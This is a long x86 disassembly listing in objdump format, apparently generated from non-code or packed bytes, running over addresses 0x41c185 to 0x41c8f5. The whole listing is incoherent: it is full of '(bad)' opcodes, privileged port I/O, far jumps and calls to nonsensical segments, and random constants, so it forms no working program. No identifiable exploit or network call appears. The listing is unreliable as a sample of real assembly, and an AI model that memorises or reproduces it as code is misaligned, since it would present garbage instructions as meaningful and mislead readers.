  41c185:	jne    0x41c12b
  41c187:	inc    esp
  41c188:	(bad)  
  41c189:	in     al,dx
  41c18a:	push   0x4f033234
  41c18f:	pushf  
  41c190:	sbb    eax,0x20958405
  41c195:	out    dx,eax
  41c196:	pop    ebx
  41c197:	pop    eax
  41c198:	loop   0x41c129
  41c19a:	inc    ecx
  41c19b:	fcomp  QWORD PTR [ebp-0x20]
  41c19e:	jne    0x41c21e
  41c1a0:	xchg   esi,eax
  41c1a1:	outs   dx,DWORD PTR ds:[esi]
  41c1a2:	sbb    cl,BYTE PTR [edi+eax*8]
  41c1a5:	and    eax,0x4b813284
  41c1aa:	xor    eax,0x9200248b
  41c1af:	lods   al,BYTE PTR ds:[esi]
  41c1b0:	add    al,0x74
  41c1b2:	inc    eax
  41c1b3:	xchg   ebp,eax
  41c1b4:	popf   
  41c1b5:	pop    esi
  41c1b6:	xor    BYTE PTR [ecx+0x4c],0xca
  41c1ba:	inc    esi
  41c1bb:	pop    ds
  41c1bc:	sub    eax,0x5492a162
  41c1c1:	or     eax,0x7eaccf82
  41c1c6:	and    edi,DWORD PTR [ecx]
  41c1c8:	jb     0x41c228
  41c1ca:	jo     0x41c1db
  41c1cc:	mov    ds:0xa74235f7,al
  41c1d1:	sbb    BYTE PTR [edx],ch
  41c1d3:	jg     0x41c252
  41c1d5:	call   0x5d3:0xf454ea35
  41c1dc:	xor    dl,bl
  41c1de:	sbb    BYTE PTR [ebp-0x27b0048e],dl
  41c1e4:	mov    BYTE PTR [ebx-0x3543555f],0x5e
  41c1eb:	ins    DWORD PTR es:[edi],dx
  41c1ec:	loopne 0x41c17b
  41c1ee:	sbb    esp,DWORD PTR [eax]
  41c1f0:	ret    
  41c1f1:	js     0x41c1c6
  41c1f3:	mov    cl,0x5a
  41c1f6:	scas   eax,DWORD PTR es:[edi]
  41c1f7:	mov    dl,0x70
  41c1f9:	push   cs
  41c1fa:	pop    ebp
  41c1fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1fc:	push   cs
  41c1fd:	add    al,0x4f
  41c1ff:	daa    
  41c200:	into   
  41c201:	in     eax,dx
  41c202:	(bad)  
  41c203:	out    0x10,al
  41c205:	out    0x9b,al
  41c207:	cmp    edi,DWORD PTR [esi]
  41c209:	in     al,0x85
  41c20b:	fcom   QWORD PTR [esi-0x31b55aff]
  41c211:	sti    
  41c212:	(bad)  
  41c213:	jmp    0xb09:0x6754d0b9
  41c21a:	cli    
  41c21b:	mov    ds:0x80cb1e01,eax
  41c220:	inc    ebx
  41c221:	js     0x41c1b3
  41c223:	stos   DWORD PTR es:[edi],eax
  41c224:	out    0x6b,eax
  41c226:	add    bl,bh
  41c228:	and    DWORD PTR [edi+eax*4-0x6e],ecx
  41c22c:	mov    ecx,edx
  41c22e:	aas    
  41c22f:	push   ds
  41c230:	adc    dh,BYTE PTR [eax+0x6c]
  41c233:	aad    0x41
  41c235:	stos   BYTE PTR es:[edi],al
  41c236:	ds jo  0x41c249
  41c239:	add    eax,0x6ba7e71d
  41c23e:	ds lahf 
  41c240:	imul   ebx,DWORD PTR [ecx-0x51],0x50
  41c244:	sub    al,0x30
  41c246:	pop    eax
  41c247:	cli    
  41c248:	stos   DWORD PTR es:[edi],eax
  41c249:	xchg   edi,eax
  41c24a:	add    eax,0xf2fcd49a
  41c24f:	xchg   ebx,eax
  41c250:	sbb    al,0xcd
  41c252:	and    cl,BYTE PTR ds:0x7b0a7ff0
  41c258:	xor    DWORD PTR [eax+edi*2+0x362c6c83],esp
  41c25f:	cmp    BYTE PTR [ecx*8+0x68e8a8ed],dl
  41c266:	add    eax,DWORD PTR [edx+ebx*8]
  41c269:	enter  0x4e6d,0xec
  41c26d:	fsub   DWORD PTR [ebp+0x48]
  41c270:	fcos   
  41c272:	cli    
  41c273:	sbb    edi,edx
  41c275:	mov    cl,0x1f
  41c277:	jnp    0x41c22b
  41c279:	das    
  41c27a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c27b:	cmp    bh,BYTE PTR [esi]
  41c27d:	dec    edx
  41c27e:	cmp    edx,DWORD PTR [ebx-0x5a]
  41c281:	mov    esp,0xdfac558
  41c286:	xchg   edx,eax
  41c287:	mov    dl,0x96
  41c289:	cld    
  41c28a:	adc    esp,DWORD PTR [ecx+0x3b]
  41c28d:	sbb    al,0xa5
  41c28f:	sbb    edi,esi
  41c291:	fcmovnbe st,st(7)
  41c293:	mov    dl,0x99
  41c295:	shr    BYTE PTR [ebx+0x38ab98c2],1
  41c29b:	sub    DWORD PTR [ecx+esi*2-0x39],0xfa46cd09
  41c2a3:	add    dl,ch
  41c2a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2a6:	pop    ds
  41c2a7:	mov    edi,0x9835aa45
  41c2ac:	xor    bl,BYTE PTR [ecx]
  41c2ae:	mov    al,0x0
  41c2b0:	inc    ecx
  41c2b1:	dec    esp
  41c2b2:	in     al,0xe6
  41c2b4:	hlt    
  41c2b5:	fwait
  41c2b6:	gs inc esp
  41c2b8:	ja     0x41c2f6
  41c2ba:	jns    0x41c285
  41c2bc:	retf   0xf8cd
  41c2bf:	sbb    sp,WORD PTR [esp+eax*2]
  41c2c3:	shr    DWORD PTR [ebx+ebx*1],0x36
  41c2c7:	cmp    eax,0x8a6e1f9f
  41c2cc:	push   ecx
  41c2cd:	jle    0x41c26b
  41c2cf:	xchg   esi,eax
  41c2d0:	sbb    ecx,DWORD PTR [ecx]
  41c2d2:	mov    dl,BYTE PTR [ecx+0x4f]
  41c2d5:	in     eax,0x55
  41c2d7:	adc    DWORD PTR [esi+ecx*1-0x1a5ec618],edi
  41c2de:	repnz inc edx
  41c2e0:	stc    
  41c2e1:	and    eax,0xae338f2d
  41c2e6:	fs add edx,esp
  41c2e9:	mov    WORD PTR [ecx-0x668e8f7b],ds
  41c2ef:	add    al,ah
  41c2f1:	and    BYTE PTR [esi],ah
  41c2f3:	popf   
  41c2f4:	push   ss
  41c2f5:	ins    BYTE PTR es:[edi],dx
  41c2f6:	das    
  41c2f7:	(bad)  
  41c2f8:	aaa    
  41c2f9:	cmp    BYTE PTR [eax],ah
  41c2fb:	or     DWORD PTR [edx+0x10d95c34],edi
  41c301:	add    DWORD PTR [ebx],eax
  41c303:	test   ebp,eax
  41c305:	outs   dx,BYTE PTR ds:[esi]
  41c306:	jae    0x41c37c
  41c308:	mov    al,ds:0x657efc37
  41c30d:	mov    bl,0xae
  41c30f:	hlt    
  41c310:	aaa    
  41c311:	sar    DWORD PTR [ecx-0x7a15ba69],0xbe
  41c318:	fidivr WORD PTR [ebx]
  41c31a:	aad    0xa
  41c31c:	jg     0x41c353
  41c31e:	or     DWORD PTR [ecx+0x3b],ecx
  41c321:	pop    esp
  41c322:	sub    edi,DWORD PTR [edi+0x0]
  41c325:	stos   BYTE PTR es:[edi],al
  41c326:	adc    DWORD PTR [edx+0x187a8da7],esi
  41c32c:	xsavec [edx]
  41c32f:	or     DWORD PTR [eax],0x76daafe3
  41c335:	mov    edx,0x65b6d18d
  41c33a:	daa    
  41c33b:	ins    BYTE PTR es:[edi],dx
  41c33c:	sub    al,0x35
  41c33e:	int3   
  41c33f:	and    ebp,DWORD PTR [eax-0x79260fe0]
  41c345:	mov    ebx,0xa06516ab
  41c34a:	or     dh,BYTE PTR [edi]
  41c34c:	inc    edx
  41c34d:	imul   ebx,DWORD PTR [ebp-0x1],0x47e66409
  41c354:	dec    ecx
  41c355:	jmp    0x41c385
  41c357:	in     eax,0x40
  41c359:	add    edi,DWORD PTR [ebx]
  41c35b:	cmp    eax,0x5bd817bb
  41c360:	cli    
  41c361:	fdivp  st(0),st
  41c363:	add    ebp,esp
  41c365:	and    eax,DWORD PTR [eax-0x23]
  41c368:	dec    eax
  41c369:	inc    ebp
  41c36a:	xchg   esp,eax
  41c36b:	adc    edi,DWORD PTR [edx+0x16]
  41c36e:	clc    
  41c36f:	pop    edx
  41c370:	data16 jge 0x41c306
  41c373:	xchg   ebx,eax
  41c374:	sub    al,0xd7
  41c376:	icebp  
  41c377:	pusha  
  41c378:	call   0x7953:0x6144da7c
  41c37f:	pop    edi
  41c380:	xor    BYTE PTR [edi],al
  41c382:	nop
  41c383:	out    dx,eax
  41c384:	pop    ds
  41c385:	push   edx
  41c386:	out    dx,al
  41c387:	hlt    
  41c388:	mov    esp,0xbedca393
  41c38d:	sbb    cl,dl
  41c38f:	cmp    eax,0x77d80421
  41c394:	repnz push ecx
  41c396:	xor    esp,DWORD PTR ss:[edx]
  41c399:	and    bl,BYTE PTR [eax+0x5f]
  41c39c:	pusha  
  41c39d:	loope  0x41c3b2
  41c39f:	std    
  41c3a0:	mov    al,ds:0xb08217f0
  41c3a5:	mov    di,0xa1e1
  41c3a9:	xlat   BYTE PTR ds:[ebx]
  41c3aa:	sar    DWORD PTR [edi+0x2ffeb831],1
  41c3b0:	repnz inc esi
  41c3b2:	addr16 add eax,0x28a148ae
  41c3b8:	mov    al,ds:0x61d4fbb4
  41c3bd:	stc    
  41c3be:	and    ebx,edi
  41c3c0:	jle    0x41c42d
  41c3c2:	cli    
  41c3c3:	js     0x41c42a
  41c3c5:	jp     0x41c3a5
  41c3c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c3c8:	outs   dx,BYTE PTR ds:[esi]
  41c3c9:	retf   0x2091
  41c3cc:	mov    ecx,0xddae5d34
  41c3d1:	stc    
  41c3d2:	or     al,0xf3
  41c3d4:	loop   0x41c3da
  41c3d6:	jne    0x41c44a
  41c3d8:	xor    DWORD PTR [ecx+0x7f4fd592],edi
  41c3de:	cdq    
  41c3df:	stos   BYTE PTR es:[edi],al
  41c3e0:	mov    esp,0x17433ad5
  41c3e5:	pop    es
  41c3e6:	mov    ebx,0x87d6fffb
  41c3eb:	push   ds
  41c3ec:	pop    edi
  41c3ed:	pop    ecx
  41c3ee:	clc    
  41c3ef:	repnz mov eax,0x6c8c5592
  41c3f5:	aam    0x5f
  41c3f7:	inc    esp
  41c3f8:	dec    eax
  41c3f9:	jg     0x41c3d9
  41c3fb:	jl     0x41c44b
  41c3fd:	call   FWORD PTR [ebx+0x32]
  41c400:	imul   ebp,DWORD PTR [edi-0x34],0xd3f3fe02
  41c407:	les    esi,FWORD PTR [ebp-0x388246f5]
  41c40d:	daa    
  41c40e:	and    DWORD PTR [eax+ecx*4],eax
  41c411:	add    ecx,DWORD PTR cs:[eax]
  41c414:	pop    ecx
  41c415:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c416:	cmp    ecx,DWORD PTR [edi]
  41c418:	cmp    DWORD PTR [edx-0x553387b1],edx
  41c41e:	aam    0x71
  41c420:	jnp    0x41c40b
  41c422:	rcl    BYTE PTR [edx-0x76fa0e1d],0x7e
  41c429:	jmp    0x2ac9:0x299aa473
  41c430:	lock fstp QWORD PTR [esi-0x5f191b3e]
  41c437:	jne    0x41c496
  41c439:	push   eax
  41c43a:	pop    esp
  41c43b:	pop    ds
  41c43c:	stc    
  41c43d:	int    0xf0
  41c43f:	cmp    bh,bl
  41c441:	inc    edi
  41c442:	mov    edi,0x67e54e37
  41c447:	or     DWORD PTR [esi],esp
  41c449:	loopne 0x41c443
  41c44b:	cli    
  41c44c:	lock pushf 
  41c44e:	push   esi
  41c44f:	mov    DWORD PTR [edi-0x2],edi
  41c452:	xchg   edx,eax
  41c453:	or     eax,DWORD PTR [ebx]
  41c455:	xor    eax,0xe847f69
  41c45a:	les    edi,FWORD PTR [ebp-0x3e]
  41c45d:	scas   eax,DWORD PTR es:[edi]
  41c45e:	xchg   edi,eax
  41c45f:	(bad)  
  41c460:	mov    ebx,0xe5996d9
  41c465:	jbe    0x41c4ae
  41c467:	sbb    bl,BYTE PTR [edi-0x570c808]
  41c46d:	pusha  
  41c46e:	fwait
  41c46f:	addr16 mov ecx,es
  41c472:	mov    edi,0xe14b1ee5
  41c477:	mov    ebp,0xa79e9df7
  41c47c:	in     eax,dx
  41c47d:	mov    edi,0x245c2e1
  41c482:	and    dl,BYTE PTR [ebp+0x5b]
  41c485:	iret   
  41c486:	sbb    DWORD PTR [edx],esi
  41c488:	mov    dh,0x2a
  41c48a:	aaa    
  41c48b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c48c:	fwait
  41c48d:	int3   
  41c48e:	mov    al,0xda
  41c490:	std    
  41c491:	xor    BYTE PTR [ebp-0x50],bl
  41c494:	dec    edi
  41c495:	pop    es
  41c496:	cmp    al,cl
  41c498:	jp     0x41c49c
  41c49a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c49b:	xchg   edx,eax
  41c49c:	je     0x41c467
  41c49e:	out    dx,eax
  41c49f:	and    cl,dl
  41c4a1:	fdivr  QWORD PTR [edx+0x425bf39e]
  41c4a7:	aad    0xd7
  41c4a9:	rol    BYTE PTR [edx+0x5a],cl
  41c4ac:	imul   ecx,ebp,0x9cc62314
  41c4b2:	and    BYTE PTR [edi+edx*1+0x6bedc2de],0x0
  41c4ba:	mov    cl,0xdb
  41c4bc:	enter  0x5791,0xbf
  41c4c0:	rcl    BYTE PTR [ebx+0x43],1
  41c4c3:	pop    ebx
  41c4c4:	xchg   DWORD PTR [edx+0x6d],ebp
  41c4c7:	inc    edx
  41c4c8:	pop    esi
  41c4c9:	mov    ebx,0x750313c5
  41c4ce:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4cf:	xor    al,0x79
  41c4d1:	js     0x41c4a1
  41c4d3:	stc    
  41c4d4:	pop    eax
  41c4d5:	pop    ds
  41c4d6:	mov    WORD PTR [edi],ss
  41c4d8:	push   es
  41c4d9:	fisttp DWORD PTR ds:[ebx-0x37]
  41c4dd:	retf   0xb33e
  41c4e0:	adc    esi,DWORD PTR [bx+di]
  41c4e3:	addr16 clc 
  41c4e5:	call   0xbdb4:0x50aca805
  41c4ec:	or     eax,0x8d29a09a
  41c4f1:	das    
  41c4f2:	ret    0x2fe3
  41c4f5:	(bad)  
  41c4f6:	fsubr  st(2),st
  41c4f8:	pop    ss
  41c4f9:	lds    ebx,FWORD PTR [ebx-0x1d71c0bf]
  41c4ff:	pusha  
  41c500:	movs   DWORD PTR es:[edi],DWORD PTR gs:[esi]
  41c502:	adc    ebp,DWORD PTR [eax*1+0xc6829a6]
  41c509:	adc    DWORD PTR [ebx+0x77a43321],0x1
  41c510:	lods   eax,DWORD PTR ds:[esi]
  41c511:	retf   
  41c512:	push   ebx
  41c513:	lock adc BYTE PTR [eax-0x424211a0],bh
  41c51a:	jg     0x41c49f
  41c51c:	(bad)  
  41c51d:	sbb    bl,BYTE PTR [esi-0x37578fb4]
  41c523:	sti    
  41c524:	icebp  
  41c525:	adc    al,0x7f
  41c527:	ror    BYTE PTR [ecx+esi*8],cl
  41c52a:	push   esi
  41c52b:	pop    edi
  41c52c:	mul    BYTE PTR [edx+0x16]
  41c52f:	sub    al,0x24
  41c532:	push   0x12
  41c534:	cmp    eax,0x51fa31c6
  41c539:	adc    BYTE PTR [eax+0x36],bh
  41c53c:	add    edx,ebx
  41c53e:	test   DWORD PTR [ecx],edi
  41c540:	xchg   BYTE PTR [eax+0x13],bl
  41c543:	dec    esp
  41c544:	pop    edx
  41c545:	xlat   BYTE PTR ds:[ebx]
  41c546:	mov    ebp,0xc2f7581c
  41c54b:	push   edi
  41c54c:	cli    
  41c54d:	cwde   
  41c54e:	popf   
  41c54f:	mov    ds:0x80856a2c,al
  41c554:	and    bh,BYTE PTR [edx]
  41c556:	lds    eax,FWORD PTR [eax+0x60]
  41c559:	lods   eax,DWORD PTR ds:[esi]
  41c55a:	mov    ds:0xd223d7c0,eax
  41c55f:	dec    esp
  41c560:	test   BYTE PTR [edx],0xaf
  41c563:	jl     0x41c4fe
  41c565:	mov    esi,0xf7b30b8b
  41c56a:	dec    esi
  41c56b:	cmp    esi,DWORD PTR [ebp-0x7bf15d2e]
  41c571:	cmp    eax,0xf5cfe911
  41c576:	jne    0x41c59a
  41c578:	fwait
  41c579:	mov    esi,0x7851bd83
  41c57e:	add    DWORD PTR [ecx],esp
  41c580:	mov    al,ds:0xe30f7e68
  41c585:	les    ebp,FWORD PTR [eax+0x5a2e1845]
  41c58b:	sub    ch,al
  41c58d:	pop    edi
  41c58e:	mov    WORD PTR fs:[ecx-0x650c06b1],es
  41c595:	repz stc 
  41c597:	scas   eax,DWORD PTR es:[edi]
  41c598:	rcr    DWORD PTR [esi+0x3d],cl
  41c59b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c59c:	pushf  
  41c59d:	gs retf 
  41c59f:	dec    esi
  41c5a0:	lea    esi,[esi]
  41c5a2:	outs   dx,BYTE PTR ds:[esi]
  41c5a3:	sbb    BYTE PTR [edi],dh
  41c5a5:	fxtract 
  41c5a7:	jae    0x41c5af
  41c5a9:	jmp    0xee1d:0xf0d12273
  41c5b0:	jo     0x41c559
  41c5b2:	adc    BYTE PTR [edi+0x3717adca],bl
  41c5b8:	addr16 dec edx
  41c5ba:	mul    DWORD PTR [eax+0xe]
  41c5bd:	dec    ebp
  41c5be:	mov    ebx,0xf6c94012
  41c5c3:	and    ebp,ebp
  41c5c5:	out    0xe7,al
  41c5c7:	imul   ebp,DWORD PTR [esi+0x8],0x16
  41c5cb:	(bad)  
  41c5cc:	shr    BYTE PTR [eax-0x4e],1
  41c5cf:	enter  0x579f,0xeb
  41c5d3:	sub    BYTE PTR [ecx+0x1],0xa2
  41c5d7:	or     edi,DWORD PTR [esi-0x1286b0ef]
  41c5dd:	mov    ecx,0xd3db1c87
  41c5e2:	in     al,dx
  41c5e3:	xor    ecx,ebp
  41c5e5:	outs   dx,BYTE PTR ds:[esi]
  41c5e6:	dec    ebp
  41c5e7:	mov    eax,0x4071df73
  41c5ec:	inc    esi
  41c5ed:	outs   dx,BYTE PTR ds:[esi]
  41c5ee:	mov    ?,WORD PTR [esi+0x68c2f255]
  41c5f4:	mov    ch,0x8b
  41c5f6:	or     eax,0xbb859d49
  41c5fb:	call   0x4f31:0xe4450db8
  41c602:	rcr    DWORD PTR [ebx-0x2f566169],0x27
  41c609:	mov    ?,WORD PTR [ebx-0x33]
  41c60c:	arpl   WORD PTR [ecx+0xb],si
  41c60f:	loopne 0x41c5d8
  41c611:	mov    esp,esp
  41c613:	xor    DWORD PTR [ebp-0x49844f5b],eax
  41c619:	std    
  41c61a:	pop    eax
  41c61b:	sub    al,BYTE PTR [eax+edi*4-0x5c69bd49]
  41c622:	out    0xc6,eax
  41c624:	adc    eax,0x575c0229
  41c629:	pop    es
  41c62a:	shl    DWORD PTR [esi],0xd1
  41c62d:	int    0xef
  41c62f:	lods   eax,DWORD PTR ds:[esi]
  41c630:	push   ecx
  41c631:	loop   0x41c608
  41c633:	push   ebx
  41c634:	int3   
  41c635:	addr16 ja 0x41c639
  41c638:	mov    gs:0xe9f46e41,al
  41c63e:	rep stos DWORD PTR es:[edi],eax
  41c640:	adc    ah,BYTE PTR [eax+0x6f]
  41c643:	pop    edx
  41c644:	adc    DWORD PTR [esp+esi*2],edx
  41c647:	pop    ss
  41c648:	mov    al,ds:0xec313cfe
  41c64d:	pop    ebx
  41c64e:	or     eax,0x1d9d9e1f
  41c653:	fsubr  QWORD PTR [ecx+0x24]
  41c656:	test   edx,ecx
  41c658:	jo     0x41c69b
  41c65a:	push   ebx
  41c65b:	test   al,0x8e
  41c65d:	dec    edi
  41c65e:	push   cs
  41c65f:	lahf   
  41c660:	jp     0x41c6b2
  41c662:	test   eax,0x5bef8857
  41c667:	xor    DWORD PTR [edi],ecx
  41c669:	mov    ds:0xbe691c71,eax
  41c66e:	pushf  
  41c66f:	imul   esp,DWORD PTR ds:0x50a5d6e6,0x453a199f
  41c679:	aaa    
  41c67a:	or     DWORD PTR [edi-0xdcf1daa],esi
  41c680:	push   es
  41c681:	pusha  
  41c682:	pusha  
  41c683:	pushf  
  41c684:	and    al,BYTE PTR [ebx]
  41c686:	fs sar bl,0x97
  41c68a:	outs   dx,BYTE PTR ds:[esi]
  41c68b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c68c:	fs (bad) 
  41c68f:	ss jns 0x41c650
  41c692:	mov    eax,0xaeea8d85
  41c697:	fistp  DWORD PTR [eax]
  41c699:	test   ah,dh
  41c69b:	mov    ch,0xc3
  41c69d:	pop    edi
  41c69e:	in     al,dx
  41c69f:	pop    eax
  41c6a0:	aas    
  41c6a1:	jle    0x41c685
  41c6a3:	cmp    esp,0x67
  41c6a6:	popf   
  41c6a7:	push   ecx
  41c6a8:	out    0x7b,eax
  41c6aa:	push   cs
  41c6ab:	adc    bl,dl
  41c6ad:	lahf   
  41c6ae:	xchg   edx,eax
  41c6af:	movd   mm6,DWORD PTR [edx-0x3c]
  41c6b3:	jmp    0xad5c45c4
  41c6b8:	loop   0x41c6d1
  41c6ba:	pop    eax
  41c6bb:	mov    eax,0x16cf5a0f
  41c6c0:	adc    BYTE PTR [ebp+edi*4+0x6b306919],bh
  41c6c7:	div    BYTE PTR [edi-0x3b]
  41c6ca:	and    eax,0xf3660071
  41c6cf:	sbb    DWORD PTR [ebx+0x372e7a1d],edx
  41c6d5:	test   BYTE PTR [edx-0x2c],ch
  41c6d8:	js     0x41c755
  41c6da:	outs   dx,BYTE PTR ds:[esi]
  41c6db:	mov    al,ds:0xee32a259
  41c6e0:	adc    BYTE PTR [ecx-0x2f1c83f6],cl
  41c6e6:	cmp    eax,0x8577ba2f
  41c6eb:	inc    ebx
  41c6ec:	inc    esp
  41c6ed:	in     al,dx
  41c6ee:	mov    ebp,0xb946051b
  41c6f3:	jl     0x41c74c
  41c6f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c6f6:	push   eax
  41c6f7:	adc    bl,cl
  41c6f9:	push   ebp
  41c6fa:	push   ebx
  41c6fb:	stos   DWORD PTR es:[edi],eax
  41c6fc:	call   0x10684c1b
  41c701:	jge    0x41c6bc
  41c703:	cs jecxz 0x41c716
  41c706:	push   ebp
  41c707:	xchg   edi,eax
  41c708:	icebp  
  41c709:	inc    ebx
  41c70a:	or     DWORD PTR [edx-0x21f323af],edx
  41c710:	out    dx,al
  41c711:	adc    DWORD PTR [ebx-0x6debd092],eax
  41c717:	in     al,0x3f
  41c719:	adc    BYTE PTR [ecx-0x69],0xb6
  41c71d:	xor    dh,bh
  41c71f:	loop   0x41c742
  41c721:	or     al,0xbb
  41c723:	mov    ss,WORD PTR [ebp-0x27]
  41c726:	xchg   edi,eax
  41c727:	jb     0x41c6b5
  41c729:	dec    edi
  41c72a:	test   al,0xc2
  41c72c:	sbb    edx,ecx
  41c72e:	in     eax,0x42
  41c730:	out    dx,eax
  41c731:	cmovg  ecx,DWORD PTR [ecx+ebp*4-0x32]
  41c736:	in     eax,0x94
  41c738:	ss jno 0x41c757
  41c73b:	sub    BYTE PTR [ecx],bh
  41c73d:	mov    esi,0xeeb2f93f
  41c742:	push   es
  41c743:	pop    ebx
  41c744:	scas   al,BYTE PTR es:[edi]
  41c745:	popa   
  41c746:	cli    
  41c747:	sbb    BYTE PTR [esp+eiz*2],bh
  41c74a:	jmp    0x41c782
  41c74c:	in     al,dx
  41c74d:	test   DWORD PTR [eax+eax*1-0x30da5ed1],ebp
  41c754:	fadd   QWORD PTR [ebx+0x52d8a414]
  41c75a:	xchg   DWORD PTR [edx],ebp
  41c75c:	xlat   BYTE PTR cs:[ebx]
  41c75e:	dec    ecx
  41c75f:	fist   WORD PTR [ecx+0x5161d031]
  41c765:	cli    
  41c766:	xlat   BYTE PTR ds:[ebx]
  41c767:	in     eax,dx
  41c768:	jae    0x41c73e
  41c76a:	pop    ebx
  41c76b:	popa   
  41c76c:	mov    ebp,esp
  41c76e:	mov    al,0x35
  41c770:	scas   eax,DWORD PTR es:[edi]
  41c771:	call   0x6a09:0xdbe31c4a
  41c778:	sahf   
  41c779:	cmc    
  41c77a:	xchg   ebx,eax
  41c77b:	bswap  esp
  41c77d:	mov    ds:0x7753b4d1,al
  41c782:	mov    al,0x89
  41c784:	sahf   
  41c785:	mov    al,ds:0xb8f76215
  41c78a:	adc    eax,0xbc578068
  41c78f:	stos   DWORD PTR es:[edi],eax
  41c790:	adc    DWORD PTR [edi+0x33],0xffffffea
  41c794:	mov    esi,0xd1d2b18d
  41c799:	fsubr  QWORD PTR ds:0x5cbc249a
  41c79f:	xchg   esi,eax
  41c7a0:	mov    ds:0x84a2b94,al
  41c7a5:	cmp    ebx,DWORD PTR [esi-0x531916c8]
  41c7ab:	jmp    0x5115:0xd5ff625
  41c7b2:	dec    esp
  41c7b3:	bound  edx,QWORD PTR ds:0xaf1f5ab0
  41c7b9:	cmp    bh,bl
  41c7bb:	inc    edi
  41c7bc:	sub    al,0xf9
  41c7be:	and    BYTE PTR [eax+0x5b],ch
  41c7c1:	inc    edi
  41c7c2:	pop    ds
  41c7c3:	mov    eax,0x1ac0e4c1
  41c7c8:	or     al,0x9f
  41c7ca:	cmp    al,0xc2
  41c7cc:	inc    ebx
  41c7cd:	pop    esi
  41c7ce:	add    DWORD PTR [eax+0x1c91fc9d],ecx
  41c7d4:	push   ds
  41c7d5:	jp     0x41c800
  41c7d7:	mov    ebp,0xc6a8651e
  41c7dc:	add    eax,0x5879a6bd
  41c7e1:	rol    DWORD PTR [esi],1
  41c7e3:	lods   al,BYTE PTR ds:[esi]
  41c7e4:	scas   al,BYTE PTR es:[edi]
  41c7e5:	or     DWORD PTR [eax-0x420efeb1],edi
  41c7eb:	sti    
  41c7ec:	cmp    BYTE PTR [edi+0x21],bl
  41c7ef:	repnz dec esp
  41c7f1:	xor    esp,edx
  41c7f3:	mov    ah,0xb2
  41c7f5:	xchg   esp,eax
  41c7f6:	mov    ah,0x57
  41c7f8:	mov    eax,ds:0xc9d5795b
  41c7fd:	sbb    DWORD PTR [ecx],ebp
  41c7ff:	xchg   edx,eax
  41c800:	inc    esi
  41c801:	fwait
  41c802:	adc    al,0x35
  41c804:	fmul   DWORD PTR [ecx+0x70cc44b1]
  41c80a:	mov    eax,0xd780d1c6
  41c80f:	stc    
  41c810:	mov    edx,0x76ae0e4c
  41c815:	outs   dx,BYTE PTR ds:[esi]
  41c816:	push   eax
  41c817:	mov    dh,0x81
  41c819:	mov    edx,0xc0399339
  41c81e:	sbb    BYTE PTR [ebx-0x20],ah
  41c821:	and    eax,esp
  41c823:	push   ds
  41c824:	(bad)
  41c829:	je     0x41c7b1
  41c82b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c82c:	jo     0x41c882
  41c82e:	nop
  41c82f:	mov    edx,0x77ea8f0c
  41c834:	mov    ecx,0x7eed6768
  41c839:	out    0xc9,al
  41c83b:	stc    
  41c83c:	mov    al,ds:0x86ad5bd4
  41c841:	in     eax,dx
  41c842:	stc    
  41c843:	das    
  41c844:	shr    BYTE PTR [edi],cl
  41c846:	mov    ah,0xef
  41c848:	jb     0x41c864
  41c84a:	jle    0x41c8b5
  41c84c:	inc    esi
  41c84d:	dec    ebp
  41c84e:	sti    
  41c84f:	imul   ebx,DWORD PTR [ebp-0x13],0x60
  41c853:	test   eax,0xb6feedcc
  41c858:	mov    bl,0xc5
  41c85a:	fwait
  41c85b:	push   esi
  41c85c:	icebp  
  41c85d:	pop    ebx
  41c85e:	jno    0x41c8d5
  41c860:	mov    eax,ds:0x9ba729d1
  41c865:	sub    al,0xe0
  41c867:	lea    eax,[ecx]
  41c869:	xchg   DWORD PTR [eax],ebx
  41c86b:	ret    
  41c86c:	push   eax
  41c86d:	pop    ebp
  41c86e:	out    dx,eax
  41c86f:	jmp    0xee17:0xfcc1c877
  41c876:	sahf   
  41c877:	sub    bh,BYTE PTR [ebx+ebp*1+0x3c]
  41c87b:	lods   eax,DWORD PTR ds:[esi]
  41c87c:	in     eax,dx
  41c87d:	push   ebx
  41c87e:	clc    
  41c87f:	pop    eax
  41c880:	mov    edx,0x339d7594
  41c885:	neg    BYTE PTR [ebp+eax*4-0x7d]
  41c889:	cmp    DWORD PTR ds:0xfbe74aa6,esi
  41c88f:	sub    eax,edi
  41c891:	dec    ebp
  41c892:	and    ebp,DWORD PTR [edx+esi*4]
  41c895:	aam    0x37
  41c897:	test   eax,0xf18db047
  41c89c:	imul   edx,DWORD PTR [esp+eiz*4],0x76559e0d
  41c8a3:	sbb    DWORD PTR [edi+0x337a0d8c],edi
  41c8a9:	test   eax,0xde4e7f51
  41c8ae:	adc    al,0x1
  41c8b0:	fucomi st,st(2)
  41c8b2:	and    ecx,DWORD PTR [eax]
  41c8b4:	dec    eax
  41c8b5:	fstp   DWORD PTR [ebx+0x14]
  41c8b8:	jle    0x41c91c
  41c8ba:	rcr    ebp,0x8d
  41c8bd:	inc    esi
  41c8be:	sbb    ebp,DWORD PTR [ecx+0x4c]
  41c8c1:	push   ecx
  41c8c2:	outs   dx,DWORD PTR ds:[esi]
  41c8c3:	jg     0x41c85c
  41c8c5:	dec    esi
  41c8c6:	add    al,0x59
  41c8c8:	das    
  41c8c9:	lea    edi,[esi+edi*2+0x62f97d89]
  41c8d0:	test   BYTE PTR [edx+0x61],0x9
  41c8d4:	jmp    0x484e:0xacfd2f8c
  41c8db:	popf   
  41c8dc:	sbb    eax,0xc733d98d
  41c8e1:	iret   
  41c8e2:	arpl   WORD PTR [edi-0x5cf53484],cx
  41c8e8:	xchg   esi,eax
  41c8e9:	and    DWORD PTR [esi+ebx*8-0x71],ebp
  41c8ed:	mov    ch,0x63
  41c8ef:	or     al,0x73
  41c8f1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c8f2:	loopne 0x41c949
  41c8f4:	pop    edi
  41c8f5:	adc    eax,0x346a2989
